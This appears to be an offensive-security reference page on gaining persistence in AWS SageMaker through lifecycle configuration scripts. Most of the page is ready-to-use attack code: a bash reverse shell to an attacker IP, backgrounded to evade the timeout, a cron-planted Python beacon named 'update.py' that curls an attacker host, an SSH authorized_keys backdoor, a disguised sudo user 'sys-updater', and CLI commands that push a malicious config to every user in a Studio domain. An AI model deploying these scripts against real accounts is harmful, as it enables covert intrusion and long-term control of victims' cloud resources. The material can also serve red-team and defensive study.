# AWS - SageMaker Persistence

## SageMaker Lifecycle Configurations (LCCs)


### LCC Overview

Amazon SageMaker is a comprehensive machine learning (ML) platform. A key feature for customizing SageMaker environments is Lifecycle Configurations (LCCs). These are shell scripts that automate environment setup upon the creation or start of SageMaker notebook instances and SageMaker Studio applications.

If an attacker gains permissions to create or modify LCCs (e.g., `sagemaker:CreateNotebookInstanceLifecycleConfig`), they can inject malicious scripts. These scripts execute with the privileges of the IAM role attached to the SageMaker resource, making LCCs a powerful vector for persistence.

### Key Constraints & Bypasses:

**Execution Time Limit:** LCC scripts are terminated after 5 minutes. This is the primary hurdle to overcome for long-running persistence mechanisms like reverse shells.

**Bypass:** The 5-minute timeout can be easily bypassed by backgrounding the malicious process using `nohup` and an ampersand (`&`). This allows the main LCC script to terminate successfully while the payload continues to run on the instance.

## Persistence in SageMaker Studio

While the examples below focus on Notebook Instances, LCCs also apply to SageMaker Studio. The impact can be much higher in Studio, as an attacker can achieve persistence across multiple users.

An attacker with permissions like `sagemaker:CreateStudioLifecycleConfig` and `sagemaker:UpdateDomain` can attach a malicious LCC to an entire SageMaker Studio Domain. This forces the LCC to run for every user and every application (e.g., JupyterLab, Code Editor) launched within that domain.

This is accomplished by creating a Studio LCC and then using the update-domain command to set it as a default for all users, effectively backdooring the entire Studio environment.

```bash
# Attacker creates a malicious Studio LCC
aws sagemaker create-studio-lifecycle-config --studio-lifecycle-config-name "malicious-default-lcc" ...

# Attacker updates the domain to apply the LCC to all users' JupyterLab apps by default
aws sagemaker update-domain --domain-id <domain-id> --default-user-settings '{
    "JupyterLabAppSettings": {
        "DefaultResourceSpec": { ... },
        "LifecycleConfigArns": ["arn:aws:sagemaker:region:account-id:studio-lifecycle-config/malicious-default-lcc"]
    }
}'
```

## Persistence Techniques via LCCs

### On-Start Reverse Shell

An attacker can configure an on-start LCC script to initiate a reverse shell every time the notebook instance is started. This provides persistent interactive access.

**Payload Example (Bash Reverse Shell):**

This script should be Base64 encoded and used as the content for the on-start LCC script.

```bash
#!/bin/bash

# Attacker's Listening IP and Port
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<ATTACKER_PORT>"

# Background the reverse shell to bypass the 5-minute LCC timeout
nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
```

### Scheduled Task / Cron Job

For stealthier, long-term persistence, an LCC can be used to inject a cron job into the ec2-user's crontab. This allows for periodic execution of a payload.

**Payload Example (Cron Job Injection):**

This script creates a payload and adds a cron job to execute it every 30 minutes.

```bash
#!/bin/bash

# Define the payload path and the command for the cron job
PAYLOAD_SCRIPT="/home/ec2-user/SageMaker/.local/update.py"
CRON_CMD="/usr/bin/python3 $PAYLOAD_SCRIPT"
CRON_JOB="*/30 * * * * $CRON_CMD"

# Create a directory for the payload
mkdir -p /home/ec2-user/SageMaker/.local

# Drop the malicious Python payload (e.g., a beacon or data exfil script)
cat << EOF > $PAYLOAD_SCRIPT
#!/usr/bin/python3
import os
# Example C2 beacon
os.system("curl -s http://<ATTACKER_IP>/beacon?id=$(hostname)")
EOF
chmod +x $PAYLOAD_SCRIPT

# Add the cron job idempotently (won't add duplicates)
(crontab -u ec2-user -l 2>/dev/null | grep -Fq "$CRON_CMD") || \
( (crontab -u ec2-user -l 2>/dev/null; echo "$CRON_JOB") | crontab -u ec2-user - )
```

## System-Level Backdoors (Requires Root)

If the SageMaker notebook instance has root access enabled (a common default), an LCC with sudo privileges can perform system-level modifications for persistence.

### SSH Backdoor via authorized_keys

This technique adds an attacker's public SSH key to a user's authorized_keys file.

**Payload Example (Add SSH Key):**

```bash
#!/bin/bash

# Attacker's public SSH key
ATTACKER_SSH_KEY="ssh-rsa AAAA..."

# Target user's authorized_keys file
TARGET_USER="ec2-user"
AUTH_KEYS_FILE="/home/$TARGET_USER/.ssh/authorized_keys"

# Ensure the .ssh directory exists and add the key
mkdir -p "$(dirname "$AUTH_KEYS_FILE")"
echo "$ATTACKER_SSH_KEY" >> "$AUTH_KEYS_FILE"

# Set correct permissions
chmod 700 "$(dirname "$AUTH_KEYS_FILE")"
chmod 600 "$AUTH_KEYS_FILE"
chown -R $TARGET_USER:$TARGET_USER "$(dirname "$AUTH_KEYS_FILE")"
```

### Backdoor User Account

This technique creates a new user with sudo privileges. This can be harder to spot than a modification to an existing user.

**Payload Example (Create Privileged User):**

```bash
#!/bin/bash

# New user details
NEW_USER="sys-updater"
NEW_PASS="A.Very.Complex.Password.123!"

# Create the new user
useradd -m -s /bin/bash $NEW_USER

# Set the password
echo "$NEW_USER:$NEW_PASS" | chpasswd

# Add the new user to the wheel group for sudo privileges
# On Amazon Linux, 'wheel' is the standard for sudo
usermod -aG wheel $NEW_USER
```

---

